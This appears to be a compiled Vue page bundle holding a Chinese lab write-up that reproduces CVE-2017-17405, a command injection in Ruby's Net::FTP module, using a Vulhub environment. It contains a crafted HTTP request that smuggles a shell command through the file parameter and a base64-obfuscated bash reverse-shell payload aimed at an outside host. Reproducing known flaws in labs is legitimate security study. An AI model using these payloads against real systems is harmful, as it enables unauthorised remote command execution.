import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as i,c as a,e as n}from"./app-58e4a7d6.js";const t={},d=n(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>Ruby Net::FTP 模块是一个FTP客户端，在上传和下载文件的过程中，打开本地文件时使用了<code>open</code>函数。而在ruby中，<code>open</code>函数是借用系统命令来打开文件，且没用过滤shell字符，导致在用户控制文件名的情况下，将可以注入任意命令。</p><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub编译及运行漏洞环境：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose build
docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>环境启动后，访问<code>http://your-ip:8080/</code>将可以看到一个HTTP服务。这个HTTP服务的作用是，我们访问<code>http://your-ip:8080/download?uri=ftp://example.com:2121/&amp;file=vulhub.txt</code>，它会从example.com:2121这个ftp服务端下载文件vulhub.txt到本地，并将内容返回给用户。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>因为这是一个FTP客户端的漏洞，所以我们需要先运行一个可以被访问到的服务端。比如使用python：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code># 安装pyftpdlib
pip install pyftpdlib

# 在当前目录下启动一个ftp服务器，默认监听在\`0.0.0.0:2121\`端口
python3 -m pyftpdlib -p 2121 -i 0.0.0.0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202282211126.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>然后即可开始利用漏洞。注入命令<code>|touch\${IFS}awesome_poc.txt</code>（空格用<code>\${IFS}</code>代替，原因不表），发送如下数据包即可（其中uri指定的ftp服务器就是我用python运行的一个简单的ftp server，其中无需放置任何文件）：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GET /download?uri=ftp://your-vps:2121/&amp;file=|touch\${IFS}awesome_poc.txt HTTP/1.1
Host: your-ip:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202282213424.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>然后进入docker容器内，可见awesome_poc.txt已被创建：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202282214280.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>执行反弹shell的命令，成功反弹：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>|bash\${IFS}-c\${IFS}&#39;{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMjgvOTk5OSAwPiYxCgo}|{base64,-d}|{bash,-i}&#39;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202282212651.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><blockquote><p>kali中反弹失败，vps反弹成功，可能是因为kali的默认shell为zsh</p></blockquote>`,19),l=[d];function c(s,o){return i(),a("div",null,l)}const u=e(t,[["render",c],["__file","Ruby NetFTP 模块命令注入漏洞 CVE-2017-17405.html.vue"]]);export{u as default};
